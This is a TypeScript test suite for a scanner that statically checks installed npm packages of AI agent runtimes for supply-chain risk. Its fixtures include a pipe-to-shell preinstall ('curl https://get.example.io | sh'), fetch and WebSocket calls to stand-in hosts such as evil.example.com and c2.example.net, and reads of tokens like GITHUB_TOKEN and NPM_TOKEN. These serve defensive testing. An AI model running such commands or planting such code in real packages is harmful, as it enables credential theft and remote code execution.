import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { cpSync, existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import Database from 'better-sqlite3';
import express from 'express';
import { rateLimit } from 'express-rate-limit';
import request from 'supertest';
import { UserRole } from '@djimitflo/shared';
import { schema } from '../database/schema';
import { runMigrations } from '../database/migrate';
import { createAuthMiddleware } from '../middleware/auth';
import { AuthService } from '../services/auth-service';
import { createHealthRoutes } from '../routes/health';
import { checkAdmission } from '../execution/runtime-admission';
import {
  defaultScanTargets, diffReports, loadTsParser, reportHash, runShippedCodeScan, scanPackage, shippedCodeScanMode, shippedCodeView, startShippedCodeScan,
} from '../services/shipped-code-scan';
import { createCleanPackage, createEvilPackage, MARKER_NAME } from './fixtures/shipped-code-packages';

const tmp: string[] = [];
const track = <T extends string>(p: T): T => { tmp.push(p); return p; };
afterEach(() => { for (const p of tmp.splice(0)) rmSync(p, { recursive: true, force: true }); });

describe('loadTsParser: the runtime `typescript-parser` alias', () => {
  it('resolves a TS-6 JS API through the alias alone (no dev typescript) and parses a fixture', async () => {
    const serverFile = join(__dirname, '../services/shipped-code-scan.ts');
    const ts = loadTsParser([[serverFile, 'typescript-parser']]);
    expect(ts).not.toBeNull();
    expect(ts!.version).toMatch(/^6\./);
    expect(loadTsParser([[serverFile, 'no-such-parser-pkg']])).toBeNull();
    const { dir, base } = createEvilPackage(); track(base);
    const r = await scanPackage(dir, { parser: ts });
    expect(r.parser).toEqual({ name: 'typescript', version: ts!.version });
    expect(r.truncated).not.toContain('js_parser_unavailable');
    expect(r.findings.length).toBeGreaterThan(0);
  });
});

describe('scanPackage: parse-only inspection of an installed package', () => {
  it('reports lifecycle scripts, bins, sorted hashed files, native binaries and parsed JS findings', async () => {
    const { dir, base } = createEvilPackage(); track(base);
    const r = await scanPackage(dir);
    expect(r.package).toEqual({ name: 'evil-runtime', version: '1.0.0' });
    expect(r.parser?.name).toBe('typescript');
    expect(r.lifecycle).toEqual([{ script: 'postinstall', command: 'node scripts/fetch-binary.js' }]); // `test` is not a lifecycle script
    expect(r.nested_lifecycle).toEqual([{ package: 'dep-a@2.0.0', path: 'node_modules/dep-a', script: 'install', command: 'node-gyp rebuild' }]);
    expect(r.bin).toEqual([{ name: 'evil', path: 'bin/evil' }, { name: 'evil-helper', path: 'lib/helper.cjs' }]);
    const paths = r.files.map((f) => f.path);
    expect(paths).toEqual([...paths].sort());
    expect(r.files.every((f) => /^[0-9a-f]{64}$/.test(f.sha256))).toBe(true);
    expect(r.binaries.map((b) => [b.path, b.format])).toEqual([['vendor/evil-darwin', 'macho'], ['vendor/evil-linux', 'elf']]);
    expect(r.binaries.every((b) => /^[0-9a-f]{64}$/.test(b.sha256))).toBe(true);

    const kinds = (kind: string) => r.findings.filter((f) => f.kind === kind);
    expect(kinds('module_import').map((f) => `${f.file}:${f.detail}`)).toEqual(expect.arrayContaining([
      'lib/index.js:process:child_process', 'lib/index.js:network:https', 'lib/index.js:network:net', 'scripts/fetch-binary.js:network:https',
    ]));
    expect(kinds('endpoint').map((f) => f.detail)).toEqual(expect.arrayContaining(['fetch https://evil.example.com/collect?x=1', 'WebSocket wss://c2.example.net/socket']));
    expect(r.hosts).toEqual(['c2.example.net', 'docs.example.org', 'downloads.example.com', 'evil.example.com']);
    expect(kinds('eval').map((f) => f.file)).toEqual(['lib/index.js']);
    expect(kinds('new_function')).toHaveLength(1);
    expect(kinds('dynamic_require')).toHaveLength(1);
    expect(kinds('dynamic_import').map((f) => f.file)).toEqual(['lib/index.js']); // './plugin.mjs' is a literal import
    expect(kinds('env_token_read').map((f) => f.detail).sort()).toEqual(['GITHUB_TOKEN', 'NPM_TOKEN', 'OPENAI_API_KEY']);
    expect(kinds('home_write').map((f) => f.file)).toEqual(['lib/index.js']);
    expect(r.findings.every((f) => f.line > 0)).toBe(true);
    // extensionless bin with a node shebang is parsed as JS
    expect(r.js.parsed).toBeGreaterThanOrEqual(6);
    expect(r.findings.some((f) => f.file === 'bin/evil' && f.kind === 'home_write')).toBe(false);
  });

  it('never executes or requires scanned code (no side-effect marker appears)', async () => {
    const { dir, base } = createEvilPackage(); track(base);
    await scanPackage(dir);
    expect(existsSync(join(base, MARKER_NAME))).toBe(false);
  });

  it('lists symlinks without following them: nothing behind a link is hashed or parsed', async () => {
    const { dir, base } = createEvilPackage(); track(base);
    const r = await scanPackage(dir);
    expect(r.symlinks.map((s) => s.path)).toEqual(['lib/linked.js', 'linked-dir']);
    expect(r.files.some((f) => f.path.startsWith('linked-dir') || f.path === 'lib/linked.js')).toBe(false);
    expect(r.hosts).not.toContain('outside.example.invalid');
    expect(r.findings.some((f) => f.file.includes('linked'))).toBe(false);
  });

  it('is deterministic: same content → same report hash, independent of where the package sits on disk', async () => {
    const { dir, base } = createEvilPackage(); track(base);
    const a = await scanPackage(dir);
    const b = await scanPackage(dir);
    expect(a.report_hash).toMatch(/^[0-9a-f]{64}$/);
    expect(b.report_hash).toBe(a.report_hash);
    expect(reportHash(a)).toBe(a.report_hash);
    expect(JSON.stringify(a)).not.toContain(base); // no absolute path in the report body
    const copy = track(mkdtempSync(join(tmpdir(), 'shipscan-copy-')));
    cpSync(dir, join(copy, 'elsewhere'), { recursive: true, verbatimSymlinks: true });
    expect((await scanPackage(join(copy, 'elsewhere'))).report_hash).toBe(a.report_hash);
    writeFileSync(join(dir, 'lib', 'plugin.mjs'), `export const u = 1;\n`);
    expect((await scanPackage(dir)).report_hash).not.toBe(a.report_hash);
  });

  it('caps: files over the parse cap are hashed but not parsed; the file cap truncates; no parser = no JS findings, flagged', async () => {
    const { dir, base } = createEvilPackage(); track(base);
    const capped = await scanPackage(dir, { maxParseBytes: 64 });
    expect(capped.js.skipped).toEqual(expect.arrayContaining([{ path: 'lib/index.js', reason: 'too_large' }]));
    expect(capped.findings.some((f) => f.file === 'lib/index.js')).toBe(false);
    expect(capped.files.some((f) => f.path === 'lib/index.js')).toBe(true);
    const few = await scanPackage(dir, { maxFiles: 3 });
    expect(few.files.length).toBeLessThanOrEqual(3);
    expect(few.truncated).toContain('max_files');
    const noParser = await scanPackage(dir, { parser: null });
    expect(noParser.parser).toBeNull();
    expect(noParser.findings).toEqual([]);
    expect(noParser.truncated).toContain('js_parser_unavailable');
    expect(noParser.lifecycle).toHaveLength(1);
  });

  it('covers the less obvious shapes: template URLs, vm, destructured fs writes, $HOME, ESM re-exports, PE magic, minified-style requires', async () => {
    const { dir, base } = createEvilPackage({ extra: {
      'lib/shapes.mjs': [
        "import { writeFileSync } from 'node:fs';",
        "export { request } from 'node:http2';",
        "import vm from 'vm';",
        "const id = 7; fetch(`https://api.example.dev/v1/${id}`);",
        "writeFileSync(process.env.HOME + '/.npmrc', 'x');",
        "globalThis.fetch('http://plain.example.dev/');",
        "new EventSource('https://sse.example.dev/stream');",
        "const s = process.env.SESSION_COOKIE; const ok = process.env.HOMEBREW_PREFIX;",
      ].join('\n'),
      'vendor/win.exe': 'MZ\x90\x00rest',
    } }); track(base);
    const r = await scanPackage(dir);
    const at = (file: string) => r.findings.filter((f) => f.file === file).map((f) => `${f.kind}:${f.detail}`);
    expect(at('lib/shapes.mjs')).toEqual(expect.arrayContaining([
      'module_import:network:http2', 'module_import:code:vm', 'endpoint:fetch https://api.example.dev/v1/', 'endpoint:fetch http://plain.example.dev/',
      'endpoint:EventSource https://sse.example.dev/stream', 'home_write:writeFileSync', 'env_token_read:SESSION_COOKIE',
    ]));
    expect(at('lib/shapes.mjs').some((x) => x.includes('HOMEBREW_PREFIX'))).toBe(false);
    expect(r.hosts).toEqual(expect.arrayContaining(['api.example.dev', 'plain.example.dev', 'sse.example.dev']));
    expect(r.binaries.find((b) => b.path === 'vendor/win.exe')?.format).toBe('pe');
  });

  it('a syntax error in shipped JS is recorded as parse-tolerant (TS recovers) and never aborts the scan', async () => {
    const { dir, base } = createEvilPackage({ extra: { 'lib/broken.js': "eval('x'); function (( {{{ \n require(dyn" } }); track(base);
    const r = await scanPackage(dir);
    expect(r.findings.some((f) => f.file === 'lib/broken.js' && f.kind === 'eval')).toBe(true);
    expect(r.lifecycle).toHaveLength(1);
    expect(r.files.some((f) => f.path === 'lib/broken.js')).toBe(true);
  });

  it('rejects a path that is not a directory', async () => {
    const { dir, base } = createEvilPackage(); track(base);
    await expect(scanPackage(join(dir, 'package.json'))).rejects.toThrow(/not a directory/);
    await expect(scanPackage(join(dir, 'linked-dir'))).rejects.toThrow(/symlink|not a directory/);
  });
});

describe('diffReports: the release-to-release delta', () => {
  it('detects a newly added postinstall and a new endpoint, a changed binary and new dynamic code', async () => {
    const base = track(mkdtempSync(join(tmpdir(), 'shipscan-diff-')));
    const v1 = createEvilPackage({ base: join(base, 'v1'), version: '1.0.0', scripts: { postinstall: undefined as unknown as string } });
    const v2 = createEvilPackage({ base: join(base, 'v2'), version: '1.1.0', scripts: { preinstall: 'curl https://get.example.io | sh' },
      extra: { 'lib/beacon.js': `fetch('https://beacon.example.io/t');\nconst g = new Function('return 1');\n`, 'vendor/evil-linux': '\x7fELFchanged' } });
    const r1 = await scanPackage(v1.dir); const r2 = await scanPackage(v2.dir);
    expect(r1.lifecycle).toEqual([]);
    const d = diffReports(r1, r2);
    expect(d.changed).toBe(true);
    expect(d.from).toMatchObject({ version: '1.0.0', report_hash: r1.report_hash });
    expect(d.to).toMatchObject({ version: '1.1.0', report_hash: r2.report_hash });
    expect(d.lifecycle.added).toEqual(['postinstall: node scripts/fetch-binary.js', 'preinstall: curl https://get.example.io | sh']);
    expect(d.lifecycle.removed).toEqual([]);
    expect(d.endpoints.added).toEqual(expect.arrayContaining(['beacon.example.io', 'fetch https://beacon.example.io/t']));
    expect(d.dynamic_code.added).toEqual(['new_function lib/beacon.js']);
    expect(d.binaries.added).toHaveLength(1);
    expect(d.binaries.removed).toHaveLength(1);
    expect(d.network_modules).toEqual({ added: [], removed: [] });
    expect(diffReports(r2, r2).changed).toBe(false);
    expect(diffReports(null, r2)).toMatchObject({ changed: true, from: null });
  });
});

describe('storage + shadow consumer', () => {
  let db: Database.Database;
  beforeEach(() => { db = new Database(':memory:'); db.exec(schema); runMigrations(db); });
  afterEach(() => db.close());

  it('stores one row per new report hash, records a shadow shipped_code_scan judgment, never changes admission', async () => {
    const { dir, base } = createEvilPackage(); track(base);
    const before = checkAdmission('opencode', '1.18.10');
    const first = await runShippedCodeScan(db, [{ runtime_id: 'opencode', path: dir }], Date.parse('2026-10-09T03:00:00Z'));
    expect(first).toEqual([expect.objectContaining({ runtime_id: 'opencode', package: 'evil-runtime', version: '1.0.0', stored: true, error: null })]);
    const again = await runShippedCodeScan(db, [{ runtime_id: 'opencode', path: dir }], Date.parse('2026-10-10T03:00:00Z'));
    expect(again[0].stored).toBe(false); // unchanged content: no new row, no new judgment
    writeFileSync(join(dir, 'lib', 'new.js'), `fetch('https://new.example.io/');\n`);
    const third = await runShippedCodeScan(db, [{ runtime_id: 'opencode', path: dir }], Date.parse('2026-10-11T03:00:00Z'));
    expect(third[0].stored).toBe(true);
    expect((db.prepare('SELECT COUNT(*) AS n FROM shipped_code_scans').get() as { n: number }).n).toBe(2);
    const judgments = db.prepare("SELECT * FROM judgments WHERE judgment = 'shipped_code_scan' ORDER BY created_at").all() as Array<Record<string, string>>;
    expect(judgments).toHaveLength(2);
    expect(judgments.every((j) => j.mode === 'shadow' && j.subject_type === 'runtime_admission' && j.subject_id === 'opencode')).toBe(true);
    const answers = JSON.parse(judgments[1].answers_json);
    expect(answers.evidence_ref_candidate).toMatch(/^shipped-code-scan:evil-runtime@1\.0\.0#[0-9a-f]{12}$/);
    expect(answers.diff.endpoints.added).toContain('new.example.io');
    // the admission as it stands for the scanned version (fixture 1.0.0 ≠ admitted 1.18.10 → drift), recorded, not changed
    const observed = checkAdmission('opencode', '1.0.0', Date.parse('2026-10-11T03:00:00Z'));
    expect(observed.allowed).toBe(false);
    expect(answers.admission).toEqual({ decision: observed.decision, ref: observed.ref, allowed: observed.allowed });
    expect(judgments[1].state_hash).toBe(third[0].report_hash);
    expect(checkAdmission('opencode', '1.18.10')).toEqual(before);
    // scanned text never lands in an LLM-facing field: the judgment carries no model
    expect(judgments.every((j) => j.model === null)).toBe(true);
  });

  it('a missing target is recorded as an error, not a crash', async () => {
    const res = await runShippedCodeScan(db, [{ runtime_id: 'codex', path: join(tmpdir(), 'definitely-missing-shipscan') }]);
    expect(res[0]).toMatchObject({ runtime_id: 'codex', stored: false });
    expect(res[0].error).toMatch(/ENOENT|not a directory/);
  });

  it('view lists the latest scan per package with its diff', async () => {
    const clean = track(createCleanPackage('1.0.0'));
    await runShippedCodeScan(db, [{ runtime_id: 'codex', path: clean }], Date.parse('2026-10-09T03:00:00Z'));
    writeFileSync(join(clean, 'package.json'), JSON.stringify({ name: 'clean-lib', version: '1.0.1', scripts: { postinstall: 'node x.js' } }));
    await runShippedCodeScan(db, [{ runtime_id: 'codex', path: clean }], Date.parse('2026-10-10T03:00:00Z'));
    const v = shippedCodeView(db, { SHIPPED_CODE_SCAN_MODE: 'shadow' });
    expect(v.mode).toBe('shadow');
    expect(v.packages).toHaveLength(1);
    expect(v.packages[0]).toMatchObject({ runtime_id: 'codex', package: 'clean-lib', version: '1.0.1', scans: 2 });
    expect(v.packages[0].diff.lifecycle.added).toEqual(['postinstall: node x.js']);
    expect(v.packages[0].summary).toMatchObject({ lifecycle_scripts: 1, binaries: 0 });
  });
});

describe('flag + trigger', () => {
  it('SHIPPED_CODE_SCAN_MODE defaults off; only shadow arms the daily scan', () => {
    expect(shippedCodeScanMode({})).toBe('off');
    expect(shippedCodeScanMode({ SHIPPED_CODE_SCAN_MODE: 'act' })).toBe('off');
    expect(shippedCodeScanMode({ SHIPPED_CODE_SCAN_MODE: 'shadow' })).toBe('shadow');
    const db = new Database(':memory:');
    expect(startShippedCodeScan(db, {})).toBeNull();
    const stop = startShippedCodeScan(db, { SHIPPED_CODE_SCAN_MODE: 'shadow' });
    expect(typeof stop).toBe('function');
    stop?.();
    db.close();
  });

  it('default targets are the runtimes the Dockerfile installs (global npm root + /opt/atomic-agent)', () => {
    expect(defaultScanTargets('/usr/local/bin/node')).toEqual([
      { runtime_id: 'claude', path: '/usr/local/lib/node_modules/@anthropic-ai/claude-code' },
      { runtime_id: 'codex', path: '/usr/local/lib/node_modules/@openai/codex' },
      { runtime_id: 'opencode', path: '/usr/local/lib/node_modules/opencode-ai' },
      { runtime_id: 'atomic', path: '/opt/atomic-agent' },
    ]);
    const dockerfile = readFileSync(join(__dirname, '../../../../Dockerfile'), 'utf8');
    for (const pkg of ['@openai/codex@', 'opencode-ai@', '@anthropic-ai/claude-code@', '/opt/atomic-agent']) expect(dockerfile).toContain(pkg);
  });
});

it('GET /api/health/shipped-code requires read:evidence and returns the latest scan per package', async () => {
  const db = new Database(':memory:'); db.exec(schema); runMigrations(db);
  const authService = new AuthService(db);
  const viewer = authService.generateToken(authService.createUser('ship-viewer@example.test', 'disposable-password', UserRole.VIEWER));
  const app = express().use(rateLimit({ windowMs: 60_000, limit: 600 })).use('/api/health', createHealthRoutes(db, createAuthMiddleware(authService)));
  expect((await request(app).get('/api/health/shipped-code')).status).toBe(401);
  const clean = track(createCleanPackage());
  await runShippedCodeScan(db, [{ runtime_id: 'codex', path: clean }]);
  const res = await request(app).get('/api/health/shipped-code').set('Authorization', `Bearer ${viewer}`);
  expect(res.status).toBe(200);
  expect(res.body).toMatchObject({ mode: 'off', packages: [expect.objectContaining({ package: 'clean-lib', runtime_id: 'codex' })] });
  db.close();
});
